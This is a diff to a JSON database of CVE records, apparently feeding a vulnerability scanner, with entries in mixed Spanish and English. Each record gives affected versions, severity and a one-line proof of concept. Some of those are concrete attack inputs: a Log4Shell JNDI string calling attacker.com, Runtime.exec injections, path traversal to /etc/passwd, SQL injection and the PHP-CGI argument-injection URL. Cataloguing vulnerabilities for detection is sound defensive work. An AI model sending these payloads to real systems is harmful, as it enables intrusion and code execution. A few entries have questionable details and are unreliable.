@@ -32,7 +32,6 @@
     "poc": "GET /foo?path=../WEB-INF/web.xml",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-55752"
   },
-
   {
     "cve": "CVE-2022-22965",
     "cve_family": "spring",
@@ -66,7 +65,6 @@
     "poc": "GET /controller/${T(java.lang.Runtime).getRuntime().exec('id')}",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-20860"
   },
-
   {
     "cve": "CVE-2024-38475",
     "cve_family": "apache",
@@ -122,7 +120,6 @@
     "poc": "GET /cgi-bin/%%32%65%%32%65/etc/passwd",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-42013"
   },
-
   {
     "cve": "CVE-2021-44228",
     "cve_family": "log4j",
@@ -134,7 +131,6 @@
     "poc": "Inyectar ${jndi:ldap://attacker.com/x} en User-Agent, X-Forwarded-For, body JSON, etc.",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
   },
-
   {
     "cve": "CVE-2020-7961",
     "cve_family": "liferay",
@@ -146,7 +142,6 @@
     "poc": "POST /api/jsonws/expandocolumn/add-column con object con clase malicious",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-7961"
   },
-
   {
     "cve": "CVE-2024-23652",
     "cve_family": "wordpress",
@@ -169,7 +164,6 @@
     "poc": "GET /wp-json/pmpro/v1/orders?code=1' UNION SELECT NULL,version()--",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-23488"
   },
-
   {
     "cve": "CVE-2018-7600",
     "cve_family": "drupal",
@@ -192,7 +186,6 @@
     "poc": "POST /node/?_format=hal_json con malicious link relations",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2019-6340"
   },
-
   {
     "cve": "CVE-2023-46604",
     "cve_family": "activemq",
@@ -204,7 +197,6 @@
     "poc": "Send malicious OpenWire packet a port 61616",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-46604"
   },
-
   {
     "cve": "CVE-2023-22515",
     "cve_family": "confluence",
@@ -227,7 +219,6 @@
     "poc": "GET /${@java.lang.Runtime@getRuntime().exec('id')}/",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2022-26134"
   },
-
   {
     "cve": "CVE-2024-23897",
     "cve_family": "jenkins",
@@ -250,7 +241,6 @@
     "poc": "GET /static/xxx/../config.xml",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-1999002"
   },
-
   {
     "cve": "CVE-2021-22205",
     "cve_family": "gitlab",
@@ -262,7 +252,6 @@
     "poc": "POST /uploads con DjVu file containing payload",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-22205"
   },
-
   {
     "cve": "CVE-2020-6287",
     "cve_family": "sap",
@@ -274,7 +263,6 @@
     "poc": "POST /CTCWebService/CTCWebServiceBean con SOAP create user",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-6287"
   },
-
   {
     "cve": "CVE-2024-21626",
     "cve_family": "k8s",
@@ -286,7 +274,6 @@
     "poc": "Exploit en build chain de container",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
   },
-
   {
     "cve": "CVE-2023-29489",
     "cve_family": "cpanel",
@@ -298,7 +285,6 @@
     "poc": "GET /cpsess0/scripts/x?<svg onload=alert>",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-29489"
   },
-
   {
     "cve": "CVE-2023-50164",
     "cve_family": "struts2",
@@ -310,7 +296,6 @@
     "poc": "POST con multipart upload + filename con path traversal",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-50164"
   },
-
   {
     "cve": "CVE-2024-3273",
     "cve_family": "dlink",
@@ -322,7 +307,6 @@
     "poc": "GET /cgi-bin/nas_sharing.cgi?user=messagebus&...&system=<cmd>",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-3273"
   },
-
   {
     "cve": "CVE-2024-27198",
     "cve_family": "teamcity",
@@ -334,7 +318,6 @@
     "poc": "POST /;jsp/x.jsp?... con ;jsp para bypass",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-27198"
   },
-
   {
     "cve": "CVE-2024-22243",
     "cve_family": "spring",
@@ -346,7 +329,6 @@
     "poc": "GET /controller?next=//evil.com",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-22243"
   },
-
   {
     "cve": "CVE-2023-44487",
     "cve_family": "http2",
@@ -358,7 +340,6 @@
     "poc": "Send rapid HEADERS+RST_STREAM via HTTP/2",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-44487"
   },
-
   {
     "cve": "CVE-2025-1080",
     "cve_family": "oracle-weblogic",
@@ -381,7 +362,6 @@
     "poc": "Send IIOP request a port 7001",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-2551"
   },
-
   {
     "cve": "CVE-2025-31161",
     "cve_family": "crushftp",
@@ -393,7 +373,6 @@
     "poc": "GET /WebInterface/function/ con crafted Cookie",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-31161"
   },
-
   {
     "cve": "CVE-2024-27316",
     "cve_family": "apache",
@@ -405,7 +384,6 @@
     "poc": "Send HTTP/2 stream with infinite CONTINUATION frames",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-27316"
   },
-
   {
     "cve": "CVE-2024-49581",
     "cve_family": "elasticsearch",
@@ -417,7 +395,6 @@
     "poc": "Use crafted API token in Authorization header",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-49581"
   },
-
   {
     "cve": "CVE-2017-9805",
     "cve_family": "struts2",
@@ -429,7 +406,6 @@
     "poc": "POST application/xml con XStream gadget",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2017-9805"
   },
-
   {
     "cve": "CVE-2023-22518",
     "cve_family": "confluence",
@@ -441,7 +417,6 @@
     "poc": "POST /json/setup-restore.action sin auth",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-22518"
   },
-
   {
     "cve": "CVE-2024-21733",
     "cve_family": "tomcat",
@@ -453,7 +428,6 @@
     "poc": "Crafted malformed request, leer error response",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-21733"
   },
-
   {
     "cve": "CVE-2024-3094",
     "cve_family": "xz-utils",
@@ -465,7 +439,6 @@
     "poc": "SSH connect con crafted certificate",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
   },
-
   {
     "cve": "CVE-2025-29927",
     "cve_family": "nextjs",
@@ -476,5 +449,170 @@
     "description": "Header x-middleware-subrequest permite bypass de middleware checks.",
     "poc": "GET /admin con header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`",
     "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-29927"
+  },
+  {
+    "cve": "CVE-2024-50603",
+    "cve_family": "aviatrix",
+    "tech_match": "Aviatrix Controller",
+    "versions_affected": "<7.1.4191,<7.2.4996",
+    "severity": "critical",
+    "title": "Aviatrix Controller — unauthenticated RCE via shell metacharacter injection",
+    "description": "API endpoints aceptan input del usuario sin sanitización → command injection y RCE pre-auth.",
+    "poc": "POST /v1/api con cloud_type que contenga shell metachars → exec",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-50603"
+  },
+  {
+    "cve": "CVE-2024-37032",
+    "cve_family": "ollama",
+    "tech_match": "Ollama",
+    "versions_affected": "<0.1.34",
+    "severity": "critical",
+    "title": "Ollama — file read + RCE via path traversal en /api/pull",
+    "description": "Endpoint /api/pull acepta digest path con .. → escritura arbitraria + RCE.",
+    "poc": "POST /api/pull {\"name\":\"x\",\"insecure\":true} con digest = ../../../etc/cron.d/x",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-37032"
+  },
+  {
+    "cve": "CVE-2024-4577",
+    "cve_family": "php-cgi",
+    "tech_match": "PHP",
+    "versions_affected": "<8.1.29,<8.2.20,<8.3.8",
+    "severity": "critical",
+    "title": "PHP CGI Windows — argument injection via %ADD encoding",
+    "description": "Encoding 0xAD (soft hyphen) bypassa best-fit mapping en PHP CGI Windows → argument injection → RCE.",
+    "poc": "GET /index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-4577"
+  },
+  {
+    "cve": "CVE-2024-21683",
+    "cve_family": "confluence",
+    "tech_match": "Atlassian Confluence",
+    "versions_affected": "<8.9.1,<7.19.22",
+    "severity": "critical",
+    "title": "Confluence Data Center — authenticated RCE via Add Language injection",
+    "description": "Add Language admin function permite upload de Java class files → RCE post-auth.",
+    "poc": "POST /admin/configurelanguage.action con malicious .class",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-21683"
+  },
+  {
+    "cve": "CVE-2024-37383",
+    "cve_family": "roundcube",
+    "tech_match": "Roundcube",
+    "versions_affected": "<1.5.7,<1.6.7",
+    "severity": "high",
+    "title": "Roundcube Webmail — stored XSS via SVG animate href",
+    "description": "Email con SVG <animate xlink:href=javascript:...> ejecuta XSS al abrir el email.",
+    "poc": "Send email con <svg><animate attributeName='href' values='javascript:alert(1)'/></svg>",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-37383"
+  },
+  {
+    "cve": "CVE-2024-50623",
+    "cve_family": "cleo",
+    "tech_match": "Cleo Harmony",
+    "versions_affected": "<5.8.0.21",
+    "severity": "critical",
+    "title": "Cleo Harmony/VLTrader/LexiCom — unauthenticated RCE via autorun directory",
+    "description": "Servicio escribe en autorun/ sin validación → execute arbitrary commands. Explotado en Clop ransomware 2024.",
+    "poc": "POST con file upload to autorun directory containing PowerShell payload",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-50623"
+  },
+  {
+    "cve": "CVE-2024-7593",
+    "cve_family": "ivanti-vtm",
+    "tech_match": "Ivanti Virtual Traffic Manager",
+    "versions_affected": "<22.2R1,<22.3R3,<22.5R2,<22.6R2,<22.7R2",
+    "severity": "critical",
+    "title": "Ivanti VTM — auth bypass via crafted request",
+    "description": "Auth bypass en admin panel via manipulación de session URL.",
+    "poc": "GET /apps/zxtm/login.cgi con crafted params bypasses auth",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-7593"
+  },
+  {
+    "cve": "CVE-2024-1208",
+    "cve_family": "argo-cd",
+    "tech_match": "ArgoCD",
+    "versions_affected": "<2.8.13,<2.9.9,<2.10.4",
+    "severity": "high",
+    "title": "ArgoCD — login DoS via concurrent OIDC reqs",
+    "description": "Login endpoint sin rate limit → DoS via concurrent OIDC token validations.",
+    "poc": "Send 1000 concurrent /api/v1/session requests",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-1208"
+  },
+  {
+    "cve": "CVE-2025-26465",
+    "cve_family": "openssh",
+    "tech_match": "OpenSSH",
+    "versions_affected": "6.8-9.9p1",
+    "severity": "high",
+    "title": "OpenSSH — MitM via VerifyHostKeyDNS overflow",
+    "description": "Cliente con VerifyHostKeyDNS=yes acepta DNS keys grandes → atacante puede impersonar servidor.",
+    "poc": "MitM SSH con cert spoofed en DNS query",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-26465"
+  },
+  {
+    "cve": "CVE-2024-40725",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.0-2.4.61",
+    "severity": "high",
+    "title": "Apache HTTPd — handler config bypass via mod_proxy",
+    "description": "AddType+SetHandler bypass via crafted URL → access a .phps source code.",
+    "poc": "GET /file.php/.something — handler removed → source disclosed",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-40725"
+  },
+  {
+    "cve": "CVE-2024-41110",
+    "cve_family": "docker",
+    "tech_match": "Docker",
+    "versions_affected": "<23.0.14,<26.1.4,<27.1.0",
+    "severity": "critical",
+    "title": "Docker AuthZ plugin bypass — privilege escalation",
+    "description": "Empty body + Content-Length: 0 bypassa AuthZ plugin → root command execution.",
+    "poc": "POST /containers/create con Content-Length: 0",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-41110"
+  },
+  {
+    "cve": "CVE-2024-7589",
+    "cve_family": "openssh",
+    "tech_match": "OpenSSH",
+    "versions_affected": "<9.5,<9.6,<9.7p1",
+    "severity": "critical",
+    "title": "OpenSSH — regreSSHion variant on FreeBSD via blhelper",
+    "description": "Race condition signal handler en sshd → root RCE pre-auth (~10000 attempts).",
+    "poc": "Many concurrent ssh attempts triggering signal handler races",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-7589"
+  },
+  {
+    "cve": "CVE-2024-45519",
+    "cve_family": "zimbra",
+    "tech_match": "Zimbra",
+    "versions_affected": "<8.8.15p46,<9.0.0p41,<10.0.9,<10.1.1",
+    "severity": "critical",
+    "title": "Zimbra — postjournal command injection RCE",
+    "description": "SMTP postjournal recibe header maliciosa con shell metachars → RCE pre-auth.",
+    "poc": "Send SMTP message con malicious CC header",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-45519"
+  },
+  {
+    "cve": "CVE-2024-9264",
+    "cve_family": "grafana",
+    "tech_match": "Grafana",
+    "versions_affected": "11.0.0-11.0.5,11.1.0-11.1.6,11.2.0-11.2.1",
+    "severity": "critical",
+    "title": "Grafana — SQL Expressions duckdb command injection RCE",
+    "description": "Feature SQL Expressions invoca duckdb sin sandboxing → RCE post-auth viewer-level.",
+    "poc": "POST /api/ds/query con DuckDB shell command via SELECT load_extension()",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-9264"
+  },
+  {
+    "cve": "CVE-2024-47533",
+    "cve_family": "cobbler",
+    "tech_match": "Cobbler",
+    "versions_affected": "<3.3.7",
+    "severity": "critical",
+    "title": "Cobbler — XMLRPC default credentials auth bypass",
+    "description": "Credenciales por defecto cobbler/cobbler nunca se cambian → RCE pre-auth via XMLRPC.",
+    "poc": "POST /cobbler_api con login(cobbler, cobbler) → ejecutar API methods",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-47533"
   }
 ]
